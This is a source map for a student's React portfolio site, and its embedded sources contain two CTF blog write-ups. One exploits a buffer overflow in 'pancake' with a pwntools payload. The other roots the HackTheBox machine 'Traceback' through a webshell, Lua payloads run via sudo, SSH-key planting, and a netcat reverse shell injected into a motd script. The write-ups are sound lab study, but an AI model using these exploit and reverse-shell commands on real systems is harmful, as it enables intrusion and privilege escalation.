{"version":3,"sources":["components/components.js","App.js","serviceWorker.js","index.js"],"names":["Header","c","this","props","size","className","text","React","Component","Cards","list","map","data","title","renderTable","Card","projects","Home","href","target","rel","to","id","Traceback","source","escapeHtml","Pancake","Blog","App","path","Boolean","window","location","hostname","match","ReactDOM","render","StrictMode","document","getElementById","navigator","serviceWorker","ready","then","registration","unregister","catch","error","console","message"],"mappings":"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","file":"static/js/main.d18dbbc7.chunk.js","sourcesContent":["import React from 'react';\n\nimport './components.css'\n\nclass Header extends React.Component {\n    render() {\n        let c;\n        if (this.props.size === \"large\") {\n            c = \"Header-Large\";\n        } else if (this.props.size === \"medium\") {\n            c = \"Header-Medium\";\n        } else if (this.props.size === \"small\") {\n            c = \"Header-Small\";\n        }\n\n        return (\n            <p className={c}>{this.props.text}</p>\n        );\n    }\n}\n\nclass Cards extends React.Component {\n    renderTable() {\n        return this.props.list.map((data) => {\n            const { title, text } = data;\n            return (\n                <div>\n                    <Card title={title} text={text} />\n                    <br />\n                </div>\n            )\n        });\n    }\n\n    render() {\n        return(\n            <div>\n                {this.renderTable()}\n            </div>\n        );\n    }\n}\n\nclass Card extends React.Component {\n    render() {\n        return (\n            <div className=\"Card\">\n                <p>{this.props.title}</p>\n                <p className=\"Text\">{this.props.text}</p> <br/>\n            </div>\n        );\n    }\n}\n\nexport {\n    Header,\n    Cards,\n};","import React from 'react';\nimport './App.css';\nimport './github-markdown.css'\nimport { Header, Cards } from './components/components';\nimport {\n  HashRouter as Router,\n  Switch,\n  Route,\n  Link\n} from \"react-router-dom\";\nimport ReactMarkdown from 'react-markdown/with-html'\n\nconst aboutme1 = \"Hi! I'm Akay. I'm a computer science student at UMass Amherst.\"\nconst aboutme2 = \"I do a lot fun things with computers, from web development to reverse engineering.\";\nconst aboutme3 = \"I'm a very fast learner with strong interests in operating systems and cybersecurity.\";\nconst aboutme4 = \"When I'm not grinding psets, I'm probably hacking things or playing dota2.\";\n\nconst projects = [\n  {\n    title: \"OSCP Prep (2020 - Present)\",\n    text: \"Currently studying for the OSCP exam, sponsored by the UMass Pentest Club.\",\n  },\n  {\n    title: \"Security Researcher (2019 - Present)\",\n    text: \"Ethical hacker making the internet a safer place.\",\n  },\n  {\n    title: \"UMass Pentest Club (2018 - Present)\",\n    text: \"All the cool computer stuff happens here.\",\n  },\n  {\n    title: \"ConceptX (2018-2019)\",\n    text: \"Helped create a platform providing quality education to students across Burma.\"\n  },\n]\n\nfunction App() {\n  return (\n    <div>\n      <Router>\n        <Switch>\n          <Route path=\"/blog/pancake\">\n            <Pancake />\n          </Route>\n          <Route path=\"/blog/traceback\">\n            <Traceback />\n          </Route>\n          <Route path=\"/blog\">\n            <Blog />\n          </Route>\n          <Route path=\"/\">\n            <Home />\n          </Route>\n        </Switch>\n      </Router>\n    </div >\n  );\n}\n\nfunction Home() {\n  return (\n    <div className=\"App\">\n      <div className=\"Main\">\n        <Header text=\"Aung Khant\" size=\"large\" />\n        <Header text=\"Coder/Hacker\" size=\"medium\" />\n        <br />\n        <a href=\"#aboutme\" className=\"Link\">about me</a>\n        <a href=\"#whatido\" className=\"Link\">what i do</a>\n        <a href=\"https://github.com/notakay/notakay.github.io/raw/master/assets/resume.pdf\" target=\"_blank\" rel=\"noopener noreferrer\" className=\"Link\">resume</a>\n        <Link to=\"/blog\" className=\"Link\">blog</Link>\n      </div>\n      <div className=\"Section\" id=\"aboutme\">\n        <Header text=\"About me\" size=\"small\" /><br />\n        <p>{aboutme1}</p><br />\n        <p>{aboutme2}</p><br />\n        <p>{aboutme3}</p><br />\n        <p>{aboutme4}</p><br />\n      </div>\n      <div className=\"Section Last\" id=\"whatido\">\n        <Header text=\"What I do\" size=\"small\" /><br />\n        <Cards list={projects} />\n      </div>\n    </div>\n  );\n}\n\nconst pancake = `\n# Pancake (HacktivityCon CTF)\n###### August 1, 2020\n**Description**\n\nPancake is a simple binary exploitation challenge from HacktivityCon CTF.\nEntering a long string causes a buffer overflow and pancake segfaults. Some familiarity with radare2 and the call stack will be helpful going through this writeup. A great guide on radare2 can be found [here](https://www.megabeets.net/a-journey-into-radare-2-part-1/).\n\n**Analysis**\n\nLoad and analyze the binary in radare2. The stack is not executable, but the file isn't protected by [canaries](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries) nor compiled with support for [position independent code](https://en.wikipedia.org/wiki/Position-independent_code). This means that there is no protection against buffer overflows and the segments will always be loaded to the same location.\n\n\\`\\`\\`\n$ r2 -A pancakes\n[0x00400700]> iI\narch     x86\nbaddr    0x400000\nbinsz    6995\nbintype  elf\nbits     64\ncanary   false\nnx       true\npic      false\n... (output truncated)\n\\`\\`\\`\n\n\nList function symbols within the binary. Although most of the functions are from C libraries and calls used by the program, two of them stand out. One of them is <code>main</code>, which is always worth checking out. The second is <code>secret_recipe</code>, which seems to be a user defined function.\n\n\\`\\`\\`\n[0x00400700]> afl\n0x00400700    1 42           entry0\n0x00400740    4 42   -> 37   sym.deregister_tm_clones\n0x00400770    4 58   -> 55   sym.register_tm_clones\n0x004007b0    3 34   -> 29   sym.__do_global_dtors_aux\n0x004007e0    1 7            entry.init0\n0x00400a70    1 2            sym.__libc_csu_fini\n0x00400a74    1 9            sym._fini\n0x0040098b    1 113          sym.secret_recipe\n0x004006d0    1 6            sym.imp.fopen\n0x00400690    1 6            sym.imp.fread\n0x00400680    1 6            sym.imp.puts\n0x00400a00    4 101          sym.__libc_csu_init\n0x00400730    1 2            sym._dl_relocate_static_pie\n0x004007e7   10 420          main\n0x00400648    3 23           sym._init\n0x00400670    1 6            sym.imp.putchar\n0x004006a0    1 6            sym.imp.printf\n0x004006b0    1 6            sym.imp.gets\n0x004006c0    1 6            sym.imp.setvbuf\n0x004006e0    1 6            sym.imp.atoi\n0x004006f0    1 6            sym.imp.usleep\n0x004000ea    1 2            fcn.004000ea\n\\`\\`\\`\n\nFirstly, examine the <code>secret_recipe</code> because it's supposed to be a secret. Going over the disassembly, the function is simple. <code>secret_recipe</code> opens a file named <code>flag.txt</code>, reads it contents and prints it out.\n\n\\`\\`\\`\n[0x00400700]> pdf @ sym.secret_recipe\n... (output truncated, radare comments removed for better readability)\n0x004009a5       488d3dce0200.   lea rdi, str.flag.txt\n0x004009ac       e81ffdffff      call sym.imp.fopen\n0x004009b1       488945f0        mov qword [stream], rax\n0x004009b5       488b55f0        mov rdx, qword [stream]\n0x004009b9       488d8560ffff.   lea rax, [ptr]\n0x004009c0       4889d1          mov rcx, rdx\n0x004009c3       ba80000000      mov edx, 0x80\n0x004009c8       be01000000      mov esi, 1\n0x004009cd       4889c7          mov rdi, rax\n0x004009d0       e8bbfcffff      call sym.imp.fread\n0x004009f4       e887fcffff      call sym.imp.puts\n\\`\\`\\`\n\nNext, skimming through the disassembly for <code>main</code>, the function also seems fairly straightforward - prints some stuff, gets user input and prints more stuff. <code>main</code> uses the <code>gets</code> function to get input. <code>gets</code> is a deprecated function that does not peform checks on input length, leading to potential buffer overflows exploits. This explains the segfault upon passing in a long string.\n\n\\`\\`\\`\n[0x00400700]> pdf @ main\n... (output truncated, radare comments removed for better readability)\n0x0040085b      e860feffff     call sym.imp.setvbuf\n0x00400860      488d3d510300.  lea rdi, str.Welcome_to_the_pancake_stacker\n0x00400867      e814feffff     call sym.imp.puts\n0x0040086c      488d3d650300.  lea rdi, str.How_many_pancakes_do_you_want\n0x00400873      e808feffff     call sym.imp.puts\n0x00400878      488d8570ffff.  lea rax, [str]\n0x0040087f      4889c7         mov rdi, rax\n0x00400882      b800000000     mov eax, 0\n0x00400887      e824feffff     call sym.imp.gets\n0x0040088c      488d8570ffff.  lea rax, [str]\n0x00400893      4889c7         mov rdi, rax\n0x00400896      b800000000     mov eax, 0\n0x0040089b      e840feffff     call sym.imp.atoi\n0x004008a0      8945f0         mov dword [var_10h], eax\n0x004008a3      488d3d4d0300.  lea rdi, str.Cooking_your_cakes\n0x004008aa      b800000000     mov eax, 0\n0x004008af      e8ecfdffff     call sym.imp.printf\n... (output truncated)\n\\`\\`\\`\n\n\nNote that <code>main</code> does not make a call to <code>secret_recipe</code>. Maybe the vulnerable <code>gets</code> can be exploited to overwrite the return address on the stack?\n\n**Exploitation**\n\nTo craft the payload, we need to identify the offset in our buffer where the return address will be placed. To do so, generate a [De Bruijn Sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) long enough string to cause a segfault. The sequence can be generated by using <code>ragg2</code>, which is part of the radare project.\n\n\\`\\`\\`\n$ ragg2 -P 200 -r\nAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA%\n\\`\\`\\`\n\nRun radare2 in debug mode <code>r2 -d ./pancake</code>. Analyze the binary and set a breakpoint at the <code>ret</code> instruction in <code>main</code>. This will pause execution of the program just before the <code>main</code> function exits, allowing us to examine the stack. <code>dc</code> to begin execution of the program, passing the De Bruijn Sequence when prompted. Since we have placed a breakpoint at the end of main, the program should pause execution. Print the first 16 bytes on the stack using <code>pxw 8 @ rsp</code>. Using the first four bytes on the stack, calculate the offset using the command <code>wopO 0x41417a41</code>. This is where we will place the address to <code>secret_recipe</code>.\n\n\\`\\`\\`\n[0x00400700]> pdf @ main\n... (output truncated)\n0x00400984      b800000000     mov eax, 0\n0x00400989      c9             leave\n0x0040098a      c3             ret\n[0x00400700]> db 0x0040098a\n[0x00400700]> dc\n... (output truncated)\nhit breakpoint at: 40098a\n[0x0040098a]> pxw 16 @ rsp\n0x7ffffe1723b8  0x41417a41 0x32414131 0x41334141 0x41413441  AzAA1AA2AA3AA4AA\n[0x0040098a]> wopO 0x41417a41\n152\n\\`\\`\\`\n\nThe final payload will be just a buffer of 152 bytes with the address of <code>secret_recipe</code> added onto the end. Since data is stored and loaded in little endian format on x86, the address to <code>secret_recipe</code> must be passed with the same endianess. Pwntools can be used to easily convert the address into little endian format, instead of doing it manually, which can be tedious. Finally create a file (if it does not already exist) in the same directory named <code>file.txt</code> to test the payload.\n\n\\`\\`\\`\n$ cat flag.txt \nFLAG{HASH123}\n$ python -c \"from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)\" | ./pancakes\n...(output truncated)\nFLAG{HASH123}\n\n[1]    17531 done                              python -c  | \n       17532 segmentation fault (core dumped)  ./pancakes\n\\`\\`\\`\n\nWith the payload working, throw it over netcat to capture the flag.\n\n\\`\\`\\`\n$ {python -c \"from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)\";cat;} | nc jh2i.com 50021\nWelcome to the pancake stacker!\nHow many pancakes do you want?\nCooking your cakes.....\nSmothering them in butter.....\nDrowning them in syrup.....\nThey're ready! Our waiters are bringing them out now...\n        _____________\n       /    ___      \\\\\n      ||    \\\\__\\\\     ||\n      ||      _      ||\n      |\\\\     /\\ \\     /|\n      \\\\ \\\\___/ ^ \\\\___/ /\n      \\\\\\\\____/_^_\\\\____//_\n    __\\\\\\\\____/_^_\\\\____// \\\\\n   /   \\____/_^_\\____/ \\\\ \\\\\n  //                   , /\n  \\\\\\\\___________   ____  /\n               \\\\_______/\n\nflag{too_many_pancakes_on_the_stack}\n\\`\\`\\`\n`\n\nconst traceback=`\n# Traceback (HackTheBox)\n###### August 19, 2020\nStarted the box by enumerating services on the machine using nmap. Nmap scan returned http and ssh services which weren't that interesting.\n\n\\`\\`\\`\n# Nmap 7.80 scan initiated Wed May 20 06:40:09 2020 as: nmap -sV -sT -oN nmap 10.10.10.181\nNmap scan report for 10.10.10.181\nHost is up (0.094s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed May 20 06:40:21 2020 -- 1 IP address (1 host up) scanned in 11.59 seconds\n\\`\\`\\`\n\nGoing to http://10.10.10.181, the website had already been owned by Xh4H and the hacker claims to have left a backdoor somewhere.\n\nRunning directory bruteforcing using Daniel Miessler's wordlists returned zero results. However, upon checking the page source, there's a comment saying \"Some of the best web shells that you might need\". \nThrowing that string into Google took me to a Github repo https://github.com/TheBinitGhimire/Web-Shells.\n\nGoing through the list of backdoors, http://10.10.10.181/smevk.php returned a <code>HTTP 200 OK</code>. Using the default credentials <code>admin:admin</code>, I was able to gain access to the webshell.\nThe webshell's interface was really ugly, but it was sufficient to do some basic enumeration.\n\\`\\`\\`\n# Determine user\n$ whoami\nwebadmin\n\n# Check home directory\n$ ls -a /home/webadmin\n. .. .bash_history .bash_logout .bashrc .cache .local .luvit_history .profile .ssh note.txt\n\n# Read note.txt\n$ cat /home/webadmin/note.txt\n- sysadmin -\nI have left a tool to practice Lua.\nI'm sure you know where to find it.\nContact me if you have any question.\n\n# List user privileges\n$ sudo -l\nMatching Defaults entries for webadmin on traceback:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser webadmin may run the following commands on traceback:\n    (sysadmin) NOPASSWD: /home/sysadmin/luvit\n\\`\\`\\`\nLooking through the results, it seems <code>/home/sysadmin/luvit</code> can be executed as the user <code>sysadmin</code> without authentication.\n\nI had never written a single line of Lua code before and after doing some googling it seems that Luvit is a runtime environment for Lua.\nReading through the documentation I tried to craft some lua payload which will be executed as <code>sysadmin</code>.\n\nThe following lua code lists files in <code>/home/sysadmin</code>\n\n\\`\\`\\`\ndirectory='/home/sysadmin/'\npfile = io.popen('ls -a \"'..directory..'\"')\nfor filename in pfile:lines() do\n    print(filename)\nend\n\\`\\`\\`\n\nTo execute this piece of code, I simply had to write this code somewhere on the box and run it using luvit. To do so, I echoed my code to <code>/tmp/</code> on the box and ran it.\n\n\\`\\`\\`\n$ echo \"directory='/home/sysadmin/';pfile = io.popen('ls -a \\\"'..directory..'\\\"');for filename in pfile:lines() do;print(filename);end\" > /tmp/listdir.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/listdir.lua\n. .. .bash_history .bash_logout .bashrc .cache .local .profile .ssh luvit user.txt\n\n\\`\\`\\`\n\nModifying the payload to print <code>/home/sysadmin/user.txt</code>, I got my first flag.\n\n\\`\\`\\`\n$ echo \"pfile = io.popen('cat /home/sysadmin/user.txt');for filename in pfile:lines() do;print(filename);end\" > /tmp/getflag.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/getflag.lua\n{{FLAG}}\n\n\\`\\`\\`\n\nEnumerating through sysadmin's home folder, I found the <code>.ssh</code> folder with the <code>authorized_keys</code> file. Adding my public key to this file should grant me ssh access as sysadmin to the box.\nUsing <code>ssh-keygen</code>, I created a new ssh keypair. The payload adds my public key to the list of authorized keys. \n\n\\`\\`\\`\n$ echo \"io.popen(\\\\\"echo '{{PUBLIC KEY}}' >> /home/sysadmin/.ssh/authorized_keys\\\\\")\" > /tmp/ssh.lua\n\n$ sudo -u sysadmin /home/sysadmin/luvit /tmp/ssh.lua\n\\`\\`\\`\n\nSsh-ed into the box using <code>ssh -i PRIVATE_KEY sysadmin@10.10.10.181</code> and I was greeted by a message from Xh4h and a shell.\n\\`\\`\\`\nâžœ  ~ ssh -i PRIVATE_KEY sysadmin@10.10.10.181\n#################################\n-------- OWNED BY XH4H  ---------\n- I guess stuff could have been configured better ^^ -\n#################################\n\nWelcome to Xh4H land \n\n$\n\\`\\`\\`\n\nTrying to privilege escalate from sysadmin to root was kinda tricky. I tried looking for files with incorrect permisions or suid binaries but found nothing. However looking through the list of processes using <code>ps -aux</code>, there was a command being executed as root that seemed to be running at intervals.\n\n\\`\\`\\`\nroot       3851  0.0  0.0   4628   772 ?        Ss   19:15   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\n\\`\\`\\`\n\nThe command seems to be restoring a backup of the message of the day (motd), which is a service that can be used to print custom greeting messages upon login - similar to the greeting from Xh4h upon ssh-ing into the box.\n\nLooking through <code>/etc/update-motd.d/</code>, there were several messages and the first one <code>/etc/update-motd.d/00-header</code> contained <code>echo \"\\nWelcome to Xh4H land \\n\"</code>, which was the greeting upon logging into the box. This could be abused by adding commands to run upon login, which will be run as root.\n\nI set up a reverse shell listener on port 1337 on my local machine. Afterwards, I edited <code>/etc/update-motd.d/00-header</code> to set up a netcat reverse shell connector. \n\n\\`\\`\\`\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{ipaddr}} 1337 >/tmp/f; echo \"\\nWelcome to Xh4Hland \\n\"\n\\`\\`\\`\n\nIn a different window, ssh into the box and monitor the reverse shell listener. Note that it may require a few tries since the motd gets overwritten every 30 seconds. If timed correctly you should have access to the root shell. Navigate to <code>/root</code> to grab the root flag.\n\n\\`\\`\\`\n$ cat /root/root.txt\n{{FLAG}}\n\n\\`\\`\\`\n\n`\n\n\nfunction Traceback() {\n  return (\n    <div className=\"App\">\n      <div className=\"Blog\">\n        <div className='markdown-body'>\n          <ReactMarkdown\n            source={traceback}\n            escapeHtml={false}\n          />\n        </div>\n      </div>\n    </div>\n  );\n}\n\nfunction Pancake() {\n  return (\n    <div className=\"App\">\n      <div className=\"Blog\">\n        <div className='markdown-body'>\n          <ReactMarkdown\n            source={pancake}\n            escapeHtml={false}\n          />\n        </div>\n      </div>\n    </div>\n  );\n}\n\nfunction Blog() {\n  return (\n    <div className=\"App\">\n      <div className=\"Main\">\n        <Header text=\"Blog\" size=\"large\" />\n        <br />\n        <Link to=\"/blog/pancake\" className=\"Link\">pancake (HacktivityCon)</Link>\n        <br/> <br/> <br/>\n        <Link to=\"/blog/traceback\" className=\"Link\">Traceback (HackTheBox)</Link>\n      </div>\n    </div>\n  );\n}\n\nexport default App;\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.0/8 are considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\nexport function register(config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl, config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          return;\n        }\n        installingWorker.onstatechange = () => {\n          if (installingWorker.state === 'installed') {\n            if (navigator.serviceWorker.controller) {\n              // At this point, the updated precached content has been fetched,\n              // but the previous service worker will still serve the older\n              // content until all client tabs are closed.\n              console.log(\n                'New content is available and will be used when all ' +\n                  'tabs for this page are closed. See https://bit.ly/CRA-PWA.'\n              );\n\n              // Execute callback\n              if (config && config.onUpdate) {\n                config.onUpdate(registration);\n              }\n            } else {\n              // At this point, everything has been precached.\n              // It's the perfect time to display a\n              // \"Content is cached for offline use.\" message.\n              console.log('Content is cached for offline use.');\n\n              // Execute callback\n              if (config && config.onSuccess) {\n                config.onSuccess(registration);\n              }\n            }\n          }\n        };\n      };\n    })\n    .catch(error => {\n      console.error('Error during service worker registration:', error);\n    });\n}\n\nfunction checkValidServiceWorker(swUrl, config) {\n  // Check if the service worker can be found. If it can't reload the page.\n  fetch(swUrl, {\n    headers: { 'Service-Worker': 'script' },\n  })\n    .then(response => {\n      // Ensure service worker exists, and that we really are getting a JS file.\n      const contentType = response.headers.get('content-type');\n      if (\n        response.status === 404 ||\n        (contentType != null && contentType.indexOf('javascript') === -1)\n      ) {\n        // No service worker found. Probably a different app. Reload the page.\n        navigator.serviceWorker.ready.then(registration => {\n          registration.unregister().then(() => {\n            window.location.reload();\n          });\n        });\n      } else {\n        // Service worker found. Proceed as normal.\n        registerValidSW(swUrl, config);\n      }\n    })\n    .catch(() => {\n      console.log(\n        'No internet connection found. App is running in offline mode.'\n      );\n    });\n}\n\nexport function unregister() {\n  if ('serviceWorker' in navigator) {\n    navigator.serviceWorker.ready\n      .then(registration => {\n        registration.unregister();\n      })\n      .catch(error => {\n        console.error(error.message);\n      });\n  }\n}\n","import React from 'react';\nimport ReactDOM from 'react-dom';\nimport './index.css';\nimport App from './App';\nimport * as serviceWorker from './serviceWorker';\n\nReactDOM.render(\n  <React.StrictMode>\n    <App />\n  </React.StrictMode>,\n  document.getElementById('root')\n);\n\n// If you want your app to work offline and load faster, you can change\n// unregister() to register() below. Note this comes with some pitfalls.\n// Learn more about service workers: https://bit.ly/CRA-PWA\nserviceWorker.unregister();\n"],"sourceRoot":""}